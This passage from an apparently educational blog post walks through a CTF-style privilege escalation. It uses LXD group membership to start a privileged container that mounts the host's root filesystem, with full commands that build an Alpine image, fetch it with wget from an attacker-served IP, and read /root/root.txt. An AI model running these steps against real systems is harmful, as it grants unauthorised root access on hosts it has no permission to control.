        In this post we are going to see, how an account on the system that is a
        member of the <code>LXD</code> group is able to escalate the root
        privilege by exploiting the features of LXD.
      </p>
      <p>
        A member of the local <code>“lxd”</code> group can instantly escalate
        the privileges to root on the host operating system. This is
        irrespective of whether that user has been granted sudo rights and does
        not require them to enter their password. The vulnerability exists even
        with the LXD snap package.
      </p>
      <p>
        LXD is a root process that carries out actions for anyone with write
        access to the LXD UNIX socket. It often does not attempt to match the
        privileges of the calling user. There are multiple methods to exploit
        this.<br />
        One of them is to use the LXD API to mount the host’s root filesystem
        into a container which is going to use in this post. This gives a
        low-privilege user root access to the host filesystem.

        <strong>Introduction to LXD and LXC</strong>
      </h3>
      <p>
        <strong>Linux Container (LXC)</strong> are often considered as a
        lightweight virtualization technology that is something in the middle
        between a chroot and a completely developed virtual machine, which
        creates an environment as close as possible to a Linux installation but
        without the need for a separate kernel.
      </p>
      <p>
        <strong>Linux daemon (LXD)</strong> is the lightervisor, or lightweight
        container hypervisor. LXD is building on top of a container technology
        called LXC which was used by Docker before. It uses the stable LXC API
        to do all the container management behind the scene, adding the REST API
        on top and providing a much simpler, more consistent user experience.
      </p>
      <h3 id="lxd-installation"><strong>LXD Installation</strong></h3>
      <pre><code>sudo apt-get install lxd
sudo apt-get install zfsutils-linux
usermod --append --groups lxd &lt;username&gt; //adduser to group
</code></pre>
      <h2 id="privilege-escalation">Privilege Escalation</h2>
      <p>
        ssh into the Exploitable machine where you have low level access and
        check <code>id</code><br />
        <img
          src="/img/blogs/lxd_privilege_escalation/1.png"
          alt="enter image description here"
        /><br />
        Here we see we are the part of lxd group.
      </p>
      <p>Now we,</p>
      <ul>
        <li>
          Download build-alpine in your local machine through the git
          repository.
        </li>
        <li>
          Execute the script “build -alpine” that will build the latest Alpine
          image as a compressed file, this step must be executed by the root
          user.
        </li>
        <li>Transfer the tar file to the host machine</li>
      </ul>
      <pre><code>git clone https://github.com/saghul/lxd-alpine-builder.git 
cd lxd-alpine-builder 
./build-alpine
</code></pre>
      <p>
        <img
          src="/img/blogs/lxd_privilege_escalation/2.png"
          alt="enter image description here"
        /><br />
        After git clone you can see above there is already a tar file available
        you can use that or can build a new file like showed above.
      </p>
      <p>
        Now create a simple python server to transfer the tar file to the host
        machine.<br />
        <code>python -m http.server</code>
      </p>
      <p>
        <img
          src="/img/blogs/lxd_privilege_escalation/3.png"
          alt="enter image description here"
        /><br />
      </p>
      <p>Now on Host machine we,</p>
      <ul>
        <li>Download the alpine image</li>
        <li>Import image for lxd</li>
        <li>Initialize the image inside a new container.</li>
        <li>Mount /root directory inside the container.</li>
      </ul>
      <pre><code>cd /tmp
wget http://10.17.32.252:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
</code></pre>
      <p>
        <img
          src="/img/blogs/lxd_privilege_escalation/4.png"
          alt="enter image description here"
        /><br />
      </p>
      <p>After that image can be added to lxd</p>
      <pre><code>lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
</code></pre>
      <pre><code>lxc image list //check the list of images
</code></pre>
      <p>
        <img
          src="/img/blogs/lxd_privilege_escalation/5.png"
          alt="enter image description here"
        /><br />
      </p>
      <p>On this machine our goal is to read this root.txt file</p>
      <p>
        <img
          src="/img/blogs/lxd_privilege_escalation/6.png"
          alt="enter image description here"
        /><br />
      </p>
      <p>So lets initialize the container</p>
      <pre><code>lxc init myimage game -c security.privileged=true
lxc config device add game mydevice disk source=/ path=/mnt recursive=true 
lxc start game
lxc exec game /bin/sh 
id
</code></pre>
      <p>
        <img
          src="/img/blogs/lxd_privilege_escalation/7.png"
          alt="enter image description here"
        /><br />
      </p>
      <p>
        As we are now inside the container and root. we can move to our
        <code>/mnt</code> path to read flag.
      </p>
      <pre><code>cd /mnt
ls
cd root
ls
cat root.txt
</code></pre>
      <p>
        <img
          src="/img/blogs/lxd_privilege_escalation/8.png"
          alt="enter image description here"
        /><br />
      </p>
      <p>We are able to read our root flag.</p>
      <p>Thankyou.</p>
